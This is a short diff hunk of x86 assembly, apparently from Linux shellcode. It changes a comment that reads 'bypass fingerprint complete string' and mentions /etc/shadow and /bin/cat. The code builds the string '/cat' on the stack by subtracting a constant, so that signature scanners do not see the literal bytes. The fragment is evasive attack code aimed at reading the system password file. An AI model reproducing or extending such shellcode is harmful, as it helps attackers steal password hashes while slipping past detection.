@@ -9,7 +9,7 @@ _start:
 cdq
 push   edx
 
-; bypass fingerprint complete string /etc/shadow
+; bypass fingerprint complete string /bin/cat
 mov esi,0x8572743f
 sub esi,0x11111110
 mov dword [esp-4] , esi
